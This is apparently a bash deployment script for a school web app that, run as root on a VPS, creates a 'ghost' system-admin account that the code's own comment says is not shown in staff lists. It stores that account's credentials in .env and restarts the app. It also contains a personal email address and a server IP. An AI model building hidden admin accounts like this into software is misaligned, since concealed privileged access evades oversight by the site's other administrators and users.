#!/usr/bin/env bash
# Create or refresh the hidden ghost (system admin) account on the VPS.
# Run ON the VPS as root:
#   cd /var/www/ocean-school && bash deploy/enable-ghost-on-vps.sh
#
# Or from your PC (enter password when prompted):
#   ssh root@185.214.134.41 "cd /var/www/ocean-school && bash deploy/enable-ghost-on-vps.sh"
set -euo pipefail

APP_DIR="${APP_DIR:-/var/www/ocean-school}"
cd "${APP_DIR}"

if [ ! -f .env ]; then
  echo "ERROR: ${APP_DIR}/.env not found."
  exit 1
fi

if grep -q '^GHOST_STAFF_PASSWORD=' .env 2>/dev/null; then
  echo "==> GHOST_STAFF_PASSWORD already set in .env"
else
  echo "==> Add ghost settings to .env (password MUST be quoted if it contains #)"
  echo ""
  read -r -p "Ghost email [tomdaniel382@gmail.com]: " GHOST_EMAIL
  GHOST_EMAIL="${GHOST_EMAIL:-tomdaniel382@gmail.com}"
  read -r -s -p "Ghost password: " GHOST_PASS
  echo ""
  if [ -z "${GHOST_PASS}" ]; then
    echo "ERROR: password cannot be empty."
    exit 1
  fi
  {
    echo ""
    echo "# Hidden system admin (ghost) — not shown in staff lists"
    echo "GHOST_STAFF_EMAIL=${GHOST_EMAIL}"
    echo "GHOST_STAFF_PASSWORD=\"${GHOST_PASS}\""
    echo "GHOST_STAFF_NAME=System Admin"
  } >> .env
  echo "==> Appended ghost vars to .env"
fi

echo "==> Seeding / updating ghost account in database..."
npm run db:init

echo "==> Restarting app..."
pm2 restart ocean-school --update-env
pm2 save

echo ""
echo "Done. Sign in at:"
echo "  http://$(hostname -I 2>/dev/null | awk '{print $1}')/admin.html"
echo "  or open a class on /classes.html with the ghost email + password."
echo "Use the exact password from GHOST_STAFF_PASSWORD in .env (quotes not part of password)."
